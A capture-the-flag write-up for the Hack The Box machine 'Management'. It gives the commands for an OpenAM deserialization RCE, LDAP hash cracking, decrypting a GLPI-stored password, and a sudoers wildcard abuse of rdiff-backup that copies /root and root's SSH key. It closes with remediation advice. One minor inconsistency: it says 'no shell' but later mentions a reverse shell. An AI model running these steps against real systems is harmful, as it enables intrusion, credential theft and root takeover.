# HTB Management – Writeup

**Target:** `management.htb` / `sso.management.htb` (Linux, Easy/Medium)

## Summary

Management is a Linux HTB machine built around a hidden OpenAM SSO portal (`sso.management.htb`), reached only after decrypting and deobfuscating a client-side JavaScript bundle on the public landing page. The exposed OpenAM instance (v16.0.5) is vulnerable to **CVE-2026-33439**, a pre-auth RCE via `jato.clientSession` deserialization, giving a shell as `openam`. From there, enumeration of the embedded OpenDJ/LDAP backend and a GLPI service recovers a chain of credentials, including an LDAP bind password protected by GLPI's own libsodium-based encryption, ending in SSH access as `owen` (user flag). Root is obtained by abusing a sudo rule that lets `owen` run `rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *` as root: the trailing wildcard lets extra `--restrict-path` / `--restrict-mode` flags be appended, which rdiff-backup's argument parser resolves last-value-wins, removing the sandbox and granting a root-privileged file server used (via a local client/server trick) to back up `/root` and recover `root.txt`.

## Recon

`nmap -sV -sC -T5` against the target shows an nginx web server hosting `management.htb`. The landing page's HTML embeds an AES-GCM key and a reference to an encrypted asset:

```html
var KEY="C+XDTUB0EuPY7BE+xzRcMP6dNjWd0h0GPxdt8tWSTVY=",FILE="assets/app.enc";
```

Decrypting `app.enc` with Python's `cryptography.hazmat.primitives.ciphers.aead.AESGCM` yields a heavily obfuscated JavaScript bundle (`javascript-obfuscator` output). Running it through **webcrack** produces readable source, which reveals a link to a second host never advertised anywhere else: `https://sso.management.htb/` — the real attack surface, an OpenAM SSO portal.

## OpenAM discovery & fingerprinting

`sso.management.htb` serves **OpenAM** (Open Identity Platform's ForgeRock-derived IAM/SSO product). The login page's HTML carries a version hint:

```
urlArgs: "v=16.0.5"
```

Forcing a Tomcat error page (invalid path to `/openam/identity`) returns a stack trace confirming the underlying Tomcat version. `gobuster` against `/openam/` enumerates the REST surface (`json/realms/root/authenticate`, `config/options.htm`, `UI/Login`, etc.), confirming a standard OpenAM deployment rather than a customized build.

## Exploitation: CVE-2026-33439

OpenAM ≤16.0.5 is vulnerable to **CVE-2026-33439**, a pre-auth remote code execution bug via `jato.clientSession` deserialization — a bypass of the whitelist fix shipped for the older CVE-2021-35464. Metasploit's `exploit/multi/http/cve_2021_35464_forgerock_openam` module reports **not exploitable** (`check` fails), which is expected: that module targets the original ForgeRock lineage, not this fork/version.

A public Python PoC for CVE-2026-33439 is used instead:

```bash
python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation '<cmd>'
```

The tool injects a command via the `cmd` HTTP header and returns its output in the HTTP response, giving command execution as the `openam` service account (no shell session, but enough for enumeration).

## Post-exploitation as openam

Using the RCE oracle to read files reveals the embedded **OpenDJ/OpenDS** LDAP backend (ports 50389 plaintext, 4444 admin/LDAPS):

- `/opt/openam/config/boot.json` – LDAP bootstrap info: `cn=dsameuser,ou=DSAME Users,dc=management,dc=htb`, host `sso.management.htb`, port `50389`.
- `/opt/openam/config/openam/.storepass` / `.keypass` – Java keystore passwords, tried (unsuccessfully) as LDAP Directory Manager credentials.
- `/opt/openam/config/opends/config/config.ldif` – contains the Directory Manager's `{SSHA512}` hash. Both John the Ripper (`--format=nsldaps`) and Hashcat (modes 1711/111) fail against it with rockyou.
- `/opt/openam/config/opends/db/userRoot/00000000.jdb` – the raw OpenDJ Berkeley DB backend file. `strings` on it surfaces an `{SSHA}` hash tied to `uid=demo,ou=people,dc=management,dc=htb`. John cracks this one (auto-detected as `nsldaps`/Salted-SHA1) to **`changeit`** — valid for the LDAP `demo` account, not an OS login.

## Pivot via GLPI

Further enumeration finds `php-fpm` and `mariadb` running with no obvious nginx vhost: **GLPI** (open-source IT asset/service-desk management). Its config exposes a plaintext MySQL credential:

```php
// /opt/glpi/config/config_db.php
class DB extends DBmysql {
   public $dbhost = '127.0.0.1';
   public $dbuser = 'glpi';
   public $dbpassword = '8rhu0L6Pw4Y7';
   public $dbdefault = 'glpidb';
}
```

Querying `glpidb` turns up the `glpi_authldaps` table, holding an LDAP sync account used to pull in managed client accounts:

```
rootdn: cn=svc-glpi,ou=services,dc=management,dc=htb
rootdn_passwd: avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==
```

The password is stored encrypted at rest using GLPI's own internal encryption scheme, not a standard hash.

## Decrypting the GLPI secret

GLPI encrypts sensitive DB fields with its `GLPIKey` class, keyed by a raw 32-byte file at `/opt/glpi/config/glpicrypt.key`. Reading GLPI's own source confirms the exact primitive — libsodium **XChaCha20-Poly1305**, with the nonce reused as both the nonce and the AAD:

```php
$nonce = mb_substr($string, 0, SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES, '8bit');
$ciphertext = mb_substr($string, SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES, null, '8bit');
$plaintext = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt($ciphertext, $nonce, $nonce, $key);
```

A first attempt with `sodium_crypto_secretbox_open` (the wrong primitive) failed MAC verification. Running the correct decrypt on the target (inside the reverse shell, where `glpicrypt.key` actually exists):

```bash
php -r '
$key = file_get_contents("/opt/glpi/config/glpicrypt.key");
$data = base64_decode("avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==");
$nonce = substr($data, 0, SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES);
$ciphertext = substr($data, SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES);
echo sodium_crypto_aead_xchacha20poly1305_ietf_decrypt($ciphertext, $nonce, $nonce, $key);
'
```

recovers the plaintext password **`WpczC40GhTbk`**.

## User flag

`ssh owen@management.htb` with the recovered password `WpczC40GhTbk` succeeds.

```
owen@management:~$ cat user.txt
b79b697629da3b46dd9dc544a5aee9fc
```

## Privilege escalation: rdiff-backup sudo abuse

`sudo -l` as `owen` shows:

```
(root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
```

**Attack vector.** The trailing `*` is a sudoers glob — it matches *any additional text* appended after the fixed prefix, since sudoers only checks the command line as a string, not rdiff-backup's own flag semantics. rdiff-backup's argument parser resolves a repeated flag with "last value wins," so appending a second `--restrict-path` / `--restrict-mode` pair overrides the first, defeating the sandbox entirely while the line still matches the sudoers rule:

```bash
sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path / --restrict-mode read-write
```

This starts cleanly (no argument-parsing error), confirming the override is accepted.

`--server` mode speaks an RPC protocol over stdin/stdout and needs a counterpart client. Rather than using SSH, the unprivileged local `rdiff-backup` client is pointed at the sudo'd process via `--remote-schema` (which must contain a `%s` placeholder — satisfied harmlessly with a trailing shell comment):

```bash
mkdir -p /home/owen/root_backup
rdiff-backup -v5 --remote-schema 'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path / --restrict-mode read-write #%s' dummy::/root /home/owen/root_backup
```

(An earlier attempt pointing directly at `/root/root.txt` failed with `Source path is not a directory` — rdiff-backup's `backup` action requires a directory source, so the whole `/root` directory is backed up instead.)

## Root flag

The backup completes with the overridden server reading `/root` as root:

```
owen@management:~$ cat /home/owen/root_backup/root.txt
36f485d4b1d17e8dd3f4a9a31857868f
```

As a bonus, the same pull also copies root's `.ssh/id_ed25519` private key, giving a second, persistent path to root access via SSH.

## Lessons learned / remediation

- **Client-side encryption is not access control.** Embedding the AES key in the page HTML only delays discovery of `sso.management.htb`; it should be removed or the subdomain should require its own authentication gate.
- **Patch OpenAM promptly.** CVE-2026-33439 is a pre-auth RCE; update to 16.0.6+ and monitor for repeat `jato.clientSession`-style deserialization bypasses, since this one bypassed an earlier fix (CVE-2021-35464).
- **Don't store secrets in app-level "encryption" as a substitute for a secrets manager.** GLPI's `GLPIKey` scheme is sound cryptographically, but the key file sits next to the database config with the same exposure — compromising the app server defeats both at once.
- **Sudoers wildcards are dangerous with multi-flag binaries.** A rule ending in `*` only constrains the literal text the admin wrote; it does nothing to stop an allowed binary from having its own earlier flags overridden by later ones on the same line. Pin the exact arguments with no trailing wildcard, or wrap the binary in a script that strips/validates arguments before invoking it.
- **Treat `--restrict-path`-style sandboxes in backup tools as weak isolation**, not a security boundary — this limitation has been acknowledged by rdiff-backup's own author since 2001.
